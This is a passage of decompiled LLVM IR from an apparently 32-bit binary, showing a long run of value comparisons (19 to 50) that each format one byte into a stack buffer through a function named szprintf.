  %v4_804a0df = call i32 @szprintf(i32 %v2_804a0cd, i32 ptrtoint ([14 x i8]* @global_var_8068aef.60 to i32), i32 %v1_804a0be)
  br label %dec_label_pc_804a0e4

dec_label_pc_804a0e4:                             ; preds = %dec_label_pc_804a0ae, %dec_label_pc_804a0b4
  %v13_804a0e4 = icmp eq i32 %v2_8049ccc, 19
  %v1_804a0e8 = icmp eq i1 %v13_804a0e4, false
  br i1 %v1_804a0e8, label %dec_label_pc_804a11a, label %dec_label_pc_804a0ea

dec_label_pc_804a0ea:                             ; preds = %dec_label_pc_804a0e4
  %v0_804a0ea = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a0ea = zext i8 %v0_804a0ea to i32
  store i32 %v1_804a0ea, i32* @edx, align 4
  %v0_804a0f4 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a0f4 = zext i8 %v0_804a0f4 to i32
  %v2_804a103 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a115 = call i32 @szprintf(i32 %v2_804a103, i32 ptrtoint ([14 x i8]* @global_var_8068afd.61 to i32), i32 %v1_804a0f4)
  br label %dec_label_pc_804a11a

dec_label_pc_804a11a:                             ; preds = %dec_label_pc_804a0e4, %dec_label_pc_804a0ea
  %v13_804a11a = icmp eq i32 %v2_8049ccc, 20
  %v1_804a11e = icmp eq i1 %v13_804a11a, false
  br i1 %v1_804a11e, label %dec_label_pc_804a150, label %dec_label_pc_804a120

dec_label_pc_804a120:                             ; preds = %dec_label_pc_804a11a
  %v0_804a120 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a120 = zext i8 %v0_804a120 to i32
  store i32 %v1_804a120, i32* @edx, align 4
  %v0_804a12a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a12a = zext i8 %v0_804a12a to i32
  %v2_804a139 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a14b = call i32 @szprintf(i32 %v2_804a139, i32 ptrtoint ([14 x i8]* @global_var_8068b0b.62 to i32), i32 %v1_804a12a)
  br label %dec_label_pc_804a150

dec_label_pc_804a150:                             ; preds = %dec_label_pc_804a11a, %dec_label_pc_804a120
  %v13_804a150 = icmp eq i32 %v2_8049ccc, 21
  %v1_804a154 = icmp eq i1 %v13_804a150, false
  br i1 %v1_804a154, label %dec_label_pc_804a186, label %dec_label_pc_804a156

dec_label_pc_804a156:                             ; preds = %dec_label_pc_804a150
  %v0_804a156 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a156 = zext i8 %v0_804a156 to i32
  store i32 %v1_804a156, i32* @edx, align 4
  %v0_804a160 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a160 = zext i8 %v0_804a160 to i32
  %v2_804a16f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a181 = call i32 @szprintf(i32 %v2_804a16f, i32 ptrtoint ([14 x i8]* @global_var_8068b19.63 to i32), i32 %v1_804a160)
  br label %dec_label_pc_804a186

dec_label_pc_804a186:                             ; preds = %dec_label_pc_804a150, %dec_label_pc_804a156
  %v13_804a186 = icmp eq i32 %v2_8049ccc, 22
  %v1_804a18a = icmp eq i1 %v13_804a186, false
  br i1 %v1_804a18a, label %dec_label_pc_804a1bc, label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a186
  %v0_804a18c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a18c = zext i8 %v0_804a18c to i32
  store i32 %v1_804a18c, i32* @edx, align 4
  %v0_804a196 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a196 = zext i8 %v0_804a196 to i32
  %v2_804a1a5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a1b7 = call i32 @szprintf(i32 %v2_804a1a5, i32 ptrtoint ([13 x i8]* @global_var_8068b27.64 to i32), i32 %v1_804a196)
  br label %dec_label_pc_804a1bc

dec_label_pc_804a1bc:                             ; preds = %dec_label_pc_804a186, %dec_label_pc_804a18c
  %v13_804a1bc = icmp eq i32 %v2_8049ccc, 23
  %v1_804a1c0 = icmp eq i1 %v13_804a1bc, false
  br i1 %v1_804a1c0, label %dec_label_pc_804a1f2, label %dec_label_pc_804a1c2

dec_label_pc_804a1c2:                             ; preds = %dec_label_pc_804a1bc
  %v0_804a1c2 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a1c2 = zext i8 %v0_804a1c2 to i32
  store i32 %v1_804a1c2, i32* @edx, align 4
  %v0_804a1cc = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a1cc = zext i8 %v0_804a1cc to i32
  %v2_804a1db = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a1ed = call i32 @szprintf(i32 %v2_804a1db, i32 ptrtoint ([13 x i8]* @global_var_8068b34.65 to i32), i32 %v1_804a1cc)
  br label %dec_label_pc_804a1f2

dec_label_pc_804a1f2:                             ; preds = %dec_label_pc_804a1bc, %dec_label_pc_804a1c2
  %v13_804a1f2 = icmp eq i32 %v2_8049ccc, 24
  %v1_804a1f6 = icmp eq i1 %v13_804a1f2, false
  br i1 %v1_804a1f6, label %dec_label_pc_804a228, label %dec_label_pc_804a1f8

dec_label_pc_804a1f8:                             ; preds = %dec_label_pc_804a1f2
  %v0_804a1f8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a1f8 = zext i8 %v0_804a1f8 to i32
  store i32 %v1_804a1f8, i32* @edx, align 4
  %v0_804a202 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a202 = zext i8 %v0_804a202 to i32
  %v2_804a211 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a223 = call i32 @szprintf(i32 %v2_804a211, i32 ptrtoint ([13 x i8]* @global_var_8068b41.66 to i32), i32 %v1_804a202)
  br label %dec_label_pc_804a228

dec_label_pc_804a228:                             ; preds = %dec_label_pc_804a1f2, %dec_label_pc_804a1f8
  %v13_804a228 = icmp eq i32 %v2_8049ccc, 25
  %v1_804a22c = icmp eq i1 %v13_804a228, false
  br i1 %v1_804a22c, label %dec_label_pc_804a25e, label %dec_label_pc_804a22e

dec_label_pc_804a22e:                             ; preds = %dec_label_pc_804a228
  %v0_804a22e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a22e = zext i8 %v0_804a22e to i32
  store i32 %v1_804a22e, i32* @edx, align 4
  %v0_804a238 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a238 = zext i8 %v0_804a238 to i32
  %v2_804a247 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a259 = call i32 @szprintf(i32 %v2_804a247, i32 ptrtoint ([13 x i8]* @global_var_8068b4e.67 to i32), i32 %v1_804a238)
  br label %dec_label_pc_804a25e

dec_label_pc_804a25e:                             ; preds = %dec_label_pc_804a228, %dec_label_pc_804a22e
  %v13_804a25e = icmp eq i32 %v2_8049ccc, 26
  %v1_804a262 = icmp eq i1 %v13_804a25e, false
  br i1 %v1_804a262, label %dec_label_pc_804a294, label %dec_label_pc_804a264

dec_label_pc_804a264:                             ; preds = %dec_label_pc_804a25e
  %v0_804a264 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a264 = zext i8 %v0_804a264 to i32
  store i32 %v1_804a264, i32* @edx, align 4
  %v0_804a26e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a26e = zext i8 %v0_804a26e to i32
  %v2_804a27d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a28f = call i32 @szprintf(i32 %v2_804a27d, i32 ptrtoint ([13 x i8]* @global_var_8068b5b.68 to i32), i32 %v1_804a26e)
  br label %dec_label_pc_804a294

dec_label_pc_804a294:                             ; preds = %dec_label_pc_804a25e, %dec_label_pc_804a264
  %v13_804a294 = icmp eq i32 %v2_8049ccc, 27
  %v1_804a298 = icmp eq i1 %v13_804a294, false
  br i1 %v1_804a298, label %dec_label_pc_804a2ca, label %dec_label_pc_804a29a

dec_label_pc_804a29a:                             ; preds = %dec_label_pc_804a294
  %v0_804a29a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a29a = zext i8 %v0_804a29a to i32
  store i32 %v1_804a29a, i32* @edx, align 4
  %v0_804a2a4 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a2a4 = zext i8 %v0_804a2a4 to i32
  %v2_804a2b3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a2c5 = call i32 @szprintf(i32 %v2_804a2b3, i32 ptrtoint ([13 x i8]* @global_var_8068b68.69 to i32), i32 %v1_804a2a4)
  br label %dec_label_pc_804a2ca

dec_label_pc_804a2ca:                             ; preds = %dec_label_pc_804a294, %dec_label_pc_804a29a
  %v13_804a2ca = icmp eq i32 %v2_8049ccc, 28
  %v1_804a2ce = icmp eq i1 %v13_804a2ca, false
  br i1 %v1_804a2ce, label %dec_label_pc_804a300, label %dec_label_pc_804a2d0

dec_label_pc_804a2d0:                             ; preds = %dec_label_pc_804a2ca
  %v0_804a2d0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a2d0 = zext i8 %v0_804a2d0 to i32
  store i32 %v1_804a2d0, i32* @edx, align 4
  %v0_804a2da = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a2da = zext i8 %v0_804a2da to i32
  %v2_804a2e9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a2fb = call i32 @szprintf(i32 %v2_804a2e9, i32 ptrtoint ([13 x i8]* @global_var_8068b75.70 to i32), i32 %v1_804a2da)
  br label %dec_label_pc_804a300

dec_label_pc_804a300:                             ; preds = %dec_label_pc_804a2ca, %dec_label_pc_804a2d0
  %v13_804a300 = icmp eq i32 %v2_8049ccc, 29
  %v1_804a304 = icmp eq i1 %v13_804a300, false
  br i1 %v1_804a304, label %dec_label_pc_804a336, label %dec_label_pc_804a306

dec_label_pc_804a306:                             ; preds = %dec_label_pc_804a300
  %v0_804a306 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a306 = zext i8 %v0_804a306 to i32
  store i32 %v1_804a306, i32* @edx, align 4
  %v0_804a310 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a310 = zext i8 %v0_804a310 to i32
  %v2_804a31f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a331 = call i32 @szprintf(i32 %v2_804a31f, i32 ptrtoint ([13 x i8]* @global_var_8068b82.71 to i32), i32 %v1_804a310)
  br label %dec_label_pc_804a336

dec_label_pc_804a336:                             ; preds = %dec_label_pc_804a300, %dec_label_pc_804a306
  %v13_804a336 = icmp eq i32 %v2_8049ccc, 30
  %v1_804a33a = icmp eq i1 %v13_804a336, false
  br i1 %v1_804a33a, label %dec_label_pc_804a36c, label %dec_label_pc_804a33c

dec_label_pc_804a33c:                             ; preds = %dec_label_pc_804a336
  %v0_804a33c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a33c = zext i8 %v0_804a33c to i32
  store i32 %v1_804a33c, i32* @edx, align 4
  %v0_804a346 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a346 = zext i8 %v0_804a346 to i32
  %v2_804a355 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a367 = call i32 @szprintf(i32 %v2_804a355, i32 ptrtoint ([13 x i8]* @global_var_8068b8f.72 to i32), i32 %v1_804a346)
  br label %dec_label_pc_804a36c

dec_label_pc_804a36c:                             ; preds = %dec_label_pc_804a336, %dec_label_pc_804a33c
  %v13_804a36c = icmp eq i32 %v2_8049ccc, 31
  %v1_804a370 = icmp eq i1 %v13_804a36c, false
  br i1 %v1_804a370, label %dec_label_pc_804a3a2, label %dec_label_pc_804a372

dec_label_pc_804a372:                             ; preds = %dec_label_pc_804a36c
  %v0_804a372 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a372 = zext i8 %v0_804a372 to i32
  store i32 %v1_804a372, i32* @edx, align 4
  %v0_804a37c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a37c = zext i8 %v0_804a37c to i32
  %v2_804a38b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a39d = call i32 @szprintf(i32 %v2_804a38b, i32 ptrtoint ([13 x i8]* @global_var_8068b9c.73 to i32), i32 %v1_804a37c)
  br label %dec_label_pc_804a3a2

dec_label_pc_804a3a2:                             ; preds = %dec_label_pc_804a36c, %dec_label_pc_804a372
  %v10_804a3a2 = icmp eq i32 %v2_8049ccc, 32
  %v1_804a3a6 = icmp eq i1 %v10_804a3a2, false
  br i1 %v1_804a3a6, label %dec_label_pc_804a3d8, label %dec_label_pc_804a3a8

dec_label_pc_804a3a8:                             ; preds = %dec_label_pc_804a3a2
  %v0_804a3a8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a3a8 = zext i8 %v0_804a3a8 to i32
  store i32 %v1_804a3a8, i32* @edx, align 4
  %v0_804a3b2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a3b2 = zext i8 %v0_804a3b2 to i32
  %v2_804a3c1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a3d3 = call i32 @szprintf(i32 %v2_804a3c1, i32 ptrtoint ([13 x i8]* @global_var_8068ba9.74 to i32), i32 %v1_804a3b2)
  br label %dec_label_pc_804a3d8

dec_label_pc_804a3d8:                             ; preds = %dec_label_pc_804a3a2, %dec_label_pc_804a3a8
  %v13_804a3d8 = icmp eq i32 %v2_8049ccc, 33
  %v1_804a3dc = icmp eq i1 %v13_804a3d8, false
  br i1 %v1_804a3dc, label %dec_label_pc_804a40e, label %dec_label_pc_804a3de

dec_label_pc_804a3de:                             ; preds = %dec_label_pc_804a3d8
  %v0_804a3de = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a3de = zext i8 %v0_804a3de to i32
  store i32 %v1_804a3de, i32* @edx, align 4
  %v0_804a3e8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a3e8 = zext i8 %v0_804a3e8 to i32
  %v2_804a3f7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a409 = call i32 @szprintf(i32 %v2_804a3f7, i32 ptrtoint ([14 x i8]* @global_var_8068bb6.75 to i32), i32 %v1_804a3e8)
  br label %dec_label_pc_804a40e

dec_label_pc_804a40e:                             ; preds = %dec_label_pc_804a3d8, %dec_label_pc_804a3de
  %v13_804a40e = icmp eq i32 %v2_8049ccc, 34
  %v1_804a412 = icmp eq i1 %v13_804a40e, false
  br i1 %v1_804a412, label %dec_label_pc_804a444, label %dec_label_pc_804a414

dec_label_pc_804a414:                             ; preds = %dec_label_pc_804a40e
  %v0_804a414 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a414 = zext i8 %v0_804a414 to i32
  store i32 %v1_804a414, i32* @edx, align 4
  %v0_804a41e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a41e = zext i8 %v0_804a41e to i32
  %v2_804a42d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a43f = call i32 @szprintf(i32 %v2_804a42d, i32 ptrtoint ([14 x i8]* @global_var_8068bc4.76 to i32), i32 %v1_804a41e)
  br label %dec_label_pc_804a444

dec_label_pc_804a444:                             ; preds = %dec_label_pc_804a40e, %dec_label_pc_804a414
  %v13_804a444 = icmp eq i32 %v2_8049ccc, 35
  %v1_804a448 = icmp eq i1 %v13_804a444, false
  br i1 %v1_804a448, label %dec_label_pc_804a47a, label %dec_label_pc_804a44a

dec_label_pc_804a44a:                             ; preds = %dec_label_pc_804a444
  %v0_804a44a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a44a = zext i8 %v0_804a44a to i32
  store i32 %v1_804a44a, i32* @edx, align 4
  %v0_804a454 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a454 = zext i8 %v0_804a454 to i32
  %v2_804a463 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a475 = call i32 @szprintf(i32 %v2_804a463, i32 ptrtoint ([14 x i8]* @global_var_8068bd2.77 to i32), i32 %v1_804a454)
  br label %dec_label_pc_804a47a

dec_label_pc_804a47a:                             ; preds = %dec_label_pc_804a444, %dec_label_pc_804a44a
  %v13_804a47a = icmp eq i32 %v2_8049ccc, 36
  %v1_804a47e = icmp eq i1 %v13_804a47a, false
  br i1 %v1_804a47e, label %dec_label_pc_804a4b0, label %dec_label_pc_804a480

dec_label_pc_804a480:                             ; preds = %dec_label_pc_804a47a
  %v0_804a480 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a480 = zext i8 %v0_804a480 to i32
  store i32 %v1_804a480, i32* @edx, align 4
  %v0_804a48a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a48a = zext i8 %v0_804a48a to i32
  %v2_804a499 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a4ab = call i32 @szprintf(i32 %v2_804a499, i32 ptrtoint ([14 x i8]* @global_var_8068be0.78 to i32), i32 %v1_804a48a)
  br label %dec_label_pc_804a4b0

dec_label_pc_804a4b0:                             ; preds = %dec_label_pc_804a47a, %dec_label_pc_804a480
  %v13_804a4b0 = icmp eq i32 %v2_8049ccc, 37
  %v1_804a4b4 = icmp eq i1 %v13_804a4b0, false
  br i1 %v1_804a4b4, label %dec_label_pc_804a4e6, label %dec_label_pc_804a4b6

dec_label_pc_804a4b6:                             ; preds = %dec_label_pc_804a4b0
  %v0_804a4b6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a4b6 = zext i8 %v0_804a4b6 to i32
  store i32 %v1_804a4b6, i32* @edx, align 4
  %v0_804a4c0 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a4c0 = zext i8 %v0_804a4c0 to i32
  %v2_804a4cf = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a4e1 = call i32 @szprintf(i32 %v2_804a4cf, i32 ptrtoint ([14 x i8]* @global_var_8068bee.79 to i32), i32 %v1_804a4c0)
  br label %dec_label_pc_804a4e6

dec_label_pc_804a4e6:                             ; preds = %dec_label_pc_804a4b0, %dec_label_pc_804a4b6
  %v13_804a4e6 = icmp eq i32 %v2_8049ccc, 38
  %v1_804a4ea = icmp eq i1 %v13_804a4e6, false
  br i1 %v1_804a4ea, label %dec_label_pc_804a51c, label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a4e6
  %v0_804a4ec = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a4ec = zext i8 %v0_804a4ec to i32
  store i32 %v1_804a4ec, i32* @edx, align 4
  %v0_804a4f6 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a4f6 = zext i8 %v0_804a4f6 to i32
  %v2_804a505 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a517 = call i32 @szprintf(i32 %v2_804a505, i32 ptrtoint ([14 x i8]* @global_var_8068bfc.80 to i32), i32 %v1_804a4f6)
  br label %dec_label_pc_804a51c

dec_label_pc_804a51c:                             ; preds = %dec_label_pc_804a4e6, %dec_label_pc_804a4ec
  %v13_804a51c = icmp eq i32 %v2_8049ccc, 39
  %v1_804a520 = icmp eq i1 %v13_804a51c, false
  br i1 %v1_804a520, label %dec_label_pc_804a552, label %dec_label_pc_804a522

dec_label_pc_804a522:                             ; preds = %dec_label_pc_804a51c
  %v0_804a522 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a522 = zext i8 %v0_804a522 to i32
  store i32 %v1_804a522, i32* @edx, align 4
  %v0_804a52c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a52c = zext i8 %v0_804a52c to i32
  %v2_804a53b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a54d = call i32 @szprintf(i32 %v2_804a53b, i32 ptrtoint ([14 x i8]* @global_var_8068c0a.81 to i32), i32 %v1_804a52c)
  br label %dec_label_pc_804a552

dec_label_pc_804a552:                             ; preds = %dec_label_pc_804a51c, %dec_label_pc_804a522
  %v13_804a552 = icmp eq i32 %v2_8049ccc, 40
  %v1_804a556 = icmp eq i1 %v13_804a552, false
  br i1 %v1_804a556, label %dec_label_pc_804a588, label %dec_label_pc_804a558

dec_label_pc_804a558:                             ; preds = %dec_label_pc_804a552
  %v0_804a558 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a558 = zext i8 %v0_804a558 to i32
  store i32 %v1_804a558, i32* @edx, align 4
  %v0_804a562 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a562 = zext i8 %v0_804a562 to i32
  %v2_804a571 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a583 = call i32 @szprintf(i32 %v2_804a571, i32 ptrtoint ([14 x i8]* @global_var_8068c18.82 to i32), i32 %v1_804a562)
  br label %dec_label_pc_804a588

dec_label_pc_804a588:                             ; preds = %dec_label_pc_804a552, %dec_label_pc_804a558
  %v13_804a588 = icmp eq i32 %v2_8049ccc, 41
  %v1_804a58c = icmp eq i1 %v13_804a588, false
  br i1 %v1_804a58c, label %dec_label_pc_804a5be, label %dec_label_pc_804a58e

dec_label_pc_804a58e:                             ; preds = %dec_label_pc_804a588
  %v0_804a58e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a58e = zext i8 %v0_804a58e to i32
  store i32 %v1_804a58e, i32* @edx, align 4
  %v0_804a598 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a598 = zext i8 %v0_804a598 to i32
  %v2_804a5a7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a5b9 = call i32 @szprintf(i32 %v2_804a5a7, i32 ptrtoint ([14 x i8]* @global_var_8068c26.83 to i32), i32 %v1_804a598)
  br label %dec_label_pc_804a5be

dec_label_pc_804a5be:                             ; preds = %dec_label_pc_804a588, %dec_label_pc_804a58e
  %v13_804a5be = icmp eq i32 %v2_8049ccc, 42
  %v1_804a5c2 = icmp eq i1 %v13_804a5be, false
  br i1 %v1_804a5c2, label %dec_label_pc_804a5f4, label %dec_label_pc_804a5c4

dec_label_pc_804a5c4:                             ; preds = %dec_label_pc_804a5be
  %v0_804a5c4 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a5c4 = zext i8 %v0_804a5c4 to i32
  store i32 %v1_804a5c4, i32* @edx, align 4
  %v0_804a5ce = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a5ce = zext i8 %v0_804a5ce to i32
  %v2_804a5dd = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a5ef = call i32 @szprintf(i32 %v2_804a5dd, i32 ptrtoint ([14 x i8]* @global_var_8068c34.84 to i32), i32 %v1_804a5ce)
  br label %dec_label_pc_804a5f4

dec_label_pc_804a5f4:                             ; preds = %dec_label_pc_804a5be, %dec_label_pc_804a5c4
  %v13_804a5f4 = icmp eq i32 %v2_8049ccc, 43
  %v1_804a5f8 = icmp eq i1 %v13_804a5f4, false
  br i1 %v1_804a5f8, label %dec_label_pc_804a62a, label %dec_label_pc_804a5fa

dec_label_pc_804a5fa:                             ; preds = %dec_label_pc_804a5f4
  %v0_804a5fa = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a5fa = zext i8 %v0_804a5fa to i32
  store i32 %v1_804a5fa, i32* @edx, align 4
  %v0_804a604 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a604 = zext i8 %v0_804a604 to i32
  %v2_804a613 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a625 = call i32 @szprintf(i32 %v2_804a613, i32 ptrtoint ([14 x i8]* @global_var_8068c42.85 to i32), i32 %v1_804a604)
  br label %dec_label_pc_804a62a

dec_label_pc_804a62a:                             ; preds = %dec_label_pc_804a5f4, %dec_label_pc_804a5fa
  %v13_804a62a = icmp eq i32 %v2_8049ccc, 44
  %v1_804a62e = icmp eq i1 %v13_804a62a, false
  br i1 %v1_804a62e, label %dec_label_pc_804a660, label %dec_label_pc_804a630

dec_label_pc_804a630:                             ; preds = %dec_label_pc_804a62a
  %v0_804a630 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a630 = zext i8 %v0_804a630 to i32
  store i32 %v1_804a630, i32* @edx, align 4
  %v0_804a63a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a63a = zext i8 %v0_804a63a to i32
  %v2_804a649 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a65b = call i32 @szprintf(i32 %v2_804a649, i32 ptrtoint ([14 x i8]* @global_var_8068c50.86 to i32), i32 %v1_804a63a)
  br label %dec_label_pc_804a660

dec_label_pc_804a660:                             ; preds = %dec_label_pc_804a62a, %dec_label_pc_804a630
  %v13_804a660 = icmp eq i32 %v2_8049ccc, 45
  %v1_804a664 = icmp eq i1 %v13_804a660, false
  br i1 %v1_804a664, label %dec_label_pc_804a696, label %dec_label_pc_804a666

dec_label_pc_804a666:                             ; preds = %dec_label_pc_804a660
  %v0_804a666 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a666 = zext i8 %v0_804a666 to i32
  store i32 %v1_804a666, i32* @edx, align 4
  %v0_804a670 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a670 = zext i8 %v0_804a670 to i32
  %v2_804a67f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a691 = call i32 @szprintf(i32 %v2_804a67f, i32 ptrtoint ([14 x i8]* @global_var_8068c5e.87 to i32), i32 %v1_804a670)
  br label %dec_label_pc_804a696

dec_label_pc_804a696:                             ; preds = %dec_label_pc_804a660, %dec_label_pc_804a666
  %v13_804a696 = icmp eq i32 %v2_8049ccc, 46
  %v1_804a69a = icmp eq i1 %v13_804a696, false
  br i1 %v1_804a69a, label %dec_label_pc_804a6cc, label %dec_label_pc_804a69c

dec_label_pc_804a69c:                             ; preds = %dec_label_pc_804a696
  %v0_804a69c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a69c = zext i8 %v0_804a69c to i32
  store i32 %v1_804a69c, i32* @edx, align 4
  %v0_804a6a6 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a6a6 = zext i8 %v0_804a6a6 to i32
  %v2_804a6b5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a6c7 = call i32 @szprintf(i32 %v2_804a6b5, i32 ptrtoint ([14 x i8]* @global_var_8068c6c.88 to i32), i32 %v1_804a6a6)
  br label %dec_label_pc_804a6cc

dec_label_pc_804a6cc:                             ; preds = %dec_label_pc_804a696, %dec_label_pc_804a69c
  %v13_804a6cc = icmp eq i32 %v2_8049ccc, 47
  %v1_804a6d0 = icmp eq i1 %v13_804a6cc, false
  br i1 %v1_804a6d0, label %dec_label_pc_804a702, label %dec_label_pc_804a6d2

dec_label_pc_804a6d2:                             ; preds = %dec_label_pc_804a6cc
  %v0_804a6d2 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a6d2 = zext i8 %v0_804a6d2 to i32
  store i32 %v1_804a6d2, i32* @edx, align 4
  %v0_804a6dc = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a6dc = zext i8 %v0_804a6dc to i32
  %v2_804a6eb = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a6fd = call i32 @szprintf(i32 %v2_804a6eb, i32 ptrtoint ([14 x i8]* @global_var_8068c7a.89 to i32), i32 %v1_804a6dc)
  br label %dec_label_pc_804a702

dec_label_pc_804a702:                             ; preds = %dec_label_pc_804a6cc, %dec_label_pc_804a6d2
  %v10_804a702 = icmp eq i32 %v2_8049ccc, 48
  %v1_804a706 = icmp eq i1 %v10_804a702, false
  br i1 %v1_804a706, label %dec_label_pc_804a738, label %dec_label_pc_804a708

dec_label_pc_804a708:                             ; preds = %dec_label_pc_804a702
  %v0_804a708 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a708 = zext i8 %v0_804a708 to i32
  store i32 %v1_804a708, i32* @edx, align 4
  %v0_804a712 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a712 = zext i8 %v0_804a712 to i32
  %v2_804a721 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a733 = call i32 @szprintf(i32 %v2_804a721, i32 ptrtoint ([14 x i8]* @global_var_8068c88.90 to i32), i32 %v1_804a712)
  br label %dec_label_pc_804a738

dec_label_pc_804a738:                             ; preds = %dec_label_pc_804a702, %dec_label_pc_804a708
  %v13_804a738 = icmp eq i32 %v2_8049ccc, 49
  %v1_804a73c = icmp eq i1 %v13_804a738, false
  br i1 %v1_804a73c, label %dec_label_pc_804a76e, label %dec_label_pc_804a73e

dec_label_pc_804a73e:                             ; preds = %dec_label_pc_804a738
  %v0_804a73e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a73e = zext i8 %v0_804a73e to i32
  store i32 %v1_804a73e, i32* @edx, align 4
  %v0_804a748 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a748 = zext i8 %v0_804a748 to i32
  %v2_804a757 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a769 = call i32 @szprintf(i32 %v2_804a757, i32 ptrtoint ([13 x i8]* @global_var_8068c96.91 to i32), i32 %v1_804a748)
  br label %dec_label_pc_804a76e

dec_label_pc_804a76e:                             ; preds = %dec_label_pc_804a738, %dec_label_pc_804a73e
  %v13_804a76e = icmp eq i32 %v2_8049ccc, 50
  %v1_804a772 = icmp eq i1 %v13_804a76e, false
  br i1 %v1_804a772, label %dec_label_pc_804a7a4, label %dec_label_pc_804a774

dec_label_pc_804a774:                             ; preds = %dec_label_pc_804a76e
  %v0_804a774 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a774 = zext i8 %v0_804a774 to i32
  store i32 %v1_804a774, i32* @edx, align 4
  %v0_804a77e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a77e = zext i8 %v0_804a77e to i32
  %v2_804a78d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a79f = call i32 @szprintf(i32 %v2_804a78d, i32 ptrtoint ([13 x i8]* @global_var_8068ca3.92 to i32), i32 %v1_804a77e)
  br label %dec_label_pc_804a7a4

dec_label_pc_804a7a4:                             ; preds = %dec_label_pc_804a76e, %dec_label_pc_804a774
